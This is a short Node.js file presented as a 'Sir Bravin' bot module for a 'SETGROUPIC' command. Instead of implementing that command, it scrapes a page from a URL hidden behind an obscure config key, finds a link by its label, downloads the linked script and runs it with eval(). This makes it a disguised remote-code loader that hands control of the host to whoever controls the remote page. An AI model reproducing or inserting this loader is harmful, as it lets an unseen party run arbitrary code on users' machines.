//  [SIR BRAVIN EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir bravin                                    
//  >> Version: 8.3.5-sir bravin Bot

const axios = require('axios');
const cheerio = require('cheerio');
const bravo = require(__dirname + "/../config");

async function fetchSETGROUPICUrl() {
  try {
    const response = await axios.get(bravo.jeepers_creeper);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("SETGROUPIC")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('SETGROUPIC not found 😭');
    }

    console.log('SETGROUPIC loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchSETGROUPICUrl();
